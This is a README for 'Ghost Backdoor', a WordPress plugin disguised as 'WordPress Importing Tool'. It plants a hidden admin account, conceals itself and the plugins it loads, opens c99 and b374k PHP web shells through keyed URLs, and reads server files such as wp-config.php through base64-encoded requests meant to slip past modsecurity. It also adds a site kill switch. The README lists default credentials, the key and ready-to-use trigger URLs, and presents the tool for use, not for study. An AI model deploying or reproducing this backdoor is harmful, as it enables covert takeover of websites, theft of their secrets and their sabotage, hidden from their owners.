# Ghost Backdoor WordPress Plugin

**Contributors**:
* [CLEANCODED](https://cleancoded.com/)

**Tested On**:
* Version 4.9
* Version 4.8
* Version 4.7

**License**: GPLv3 or later

# Description

This plugin does the following:
* Creates a ghost admin user
* Installs any additional plugins from the included ./plugins/ folder
* Hides said ghost admin user in the WordPress backend area
* Hides the backend plugin and any additional plugins loaded by it
* Hides plugin and user counters
* Adds a "kill switch” feature that, if activated via URL, redirects all pages to "bummersauce.com"
* Adds a method to access the c99 and b374k PHP shells via URL

# Installation

1. Download the latest release of ghost backdoor plugin here: 
    * https://github.com/cleancoded/ghost-backdoor-wordpress/
2. Modify ghost backdoor plugin as needed. 
    * The backdoor username, password and key are all stored in the __construct() method of the plugin. 
    * Search for `$this->username =`, `$this->password =`, and `$this->key =` to find the values that can be updated. 
3. Upload plugin files to the `/wp-content/plugins/wp-default/` directory (create this if it does exist), or install the plugin through the plugins area of the WordPress backend if you want to keep defaults.
4. Activate the plugin through the 'Plugins' area of the WordPress backend. It is called `WordPress Importing Tool`
5. Login as the newly created ghost user.

# Frequently Asked Questions

* **What is the default login of the WordPress ghost admin user?**
    * Username: Hc462N5M4bP4SMk
    * Password: K6BJ8V4JE6NeJ6g

* **What is the default key?**
    * a9J4dquMy3Qw7dvwN4yMvVm68K

* **How do I access the PHP shell?**
    * To access the c99 PHP shell on http://localhost.com, navigate to this url:    
        * http://localhost.com/loadshell-c99-a9J4dquMy3Qw7dvwN4yMvVm68K
    * To access the b374k PHP shell on http://localhost.com, navigate to this url:    
        * http://localhost.com/loadshell-b374k-a9J4dquMy3Qw7dvwN4yMvVm68K
    * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.

* **How do I use the killsite feature?**
    * To kill the website, for example http://localhost.com, navigate to this url:
        * http://localhost.com/killsite-a9J4dquMy3Qw7dvwN4yMvVm68K
    * The pattern for this is `killsite-(KEY)`.

* **How do I view site files using the displayfile feature?**
    * The function accepts base64 encoded filenames.
    * To view wp-config.php when viewing from the main webpage of localhost.com, you would navigate to this url:
        * http://localhost.com/?displayfile-d3AtY29uZmlnLnBocA==
    * The pattern for this is `?displayfile=(BASE64_ENCODE(FILENAME))`

* **Does the ghost admin user display to the other site admins?**
    * Nope, the ghost user is invisible; it is visible only to the authenticated ghost user. All other users will not see the ghost user.

* **Do any users see the plugins installed by ghost?**
    * No, the plugins installed by ghost are hidden to all users except the authenticated ghost user. Upon deactivation, these plugins will be deleted to allow for less likely intrusion detection.

* **If I deactivate the plugin, will I still have access to the website?**
    * No, upon deactivation, the plugin will remove the ghost admin user and delete all plugins that it previously installed.  The only remains of the plugin will be the plugin itself, so it’s a good idea to delete the plugin files, excluding the plugin itself, before deactivating. 

# Changelog

* **0.4**
    * Major rebuild
    * Dynamic plugin system allows users to include additional plugin zip files in the ./plugins/ folder for upload
        * Installs & activates plugins on backdoor activation
        * Uninstalls plugins on backdoor deactivation
        * Keeps these plugins activated by attempting to activate on every page load by any visitor on the website
    * Ghost admin user deleted on deactivation
    * Added functionality to view any file on the filesystem from the URL + base64 encoded to avoid modsecurity detection

* **0.3**
    * Added dynamic shell inclusion from the ./sh/ folder to allow users to utilize whatever shell they prefer instead of specifically c99
    * Updated the hook used to view wp-config.php

* **0.2**
    * Changed class layout for easier modification/use and less chance of conflict
    * C99 shell inclusion by accessing it directly through plugin folder
    * Added killswitch functionality
    * Added functionality to view wp-config.php

* **0.1**
    * Made backdoor user creation routines
    * Made backdoor user hidden from all users
    * Made additional plugins forcefully activate if they are installed and keep them activated

# Roadmap

* Allow for custom code inclusion that takes advantage of the various WP_GHOST classes and methods
* Implement a new admin menu/backend area that only the ghost admin user can access for easier manipulation of the backdoor
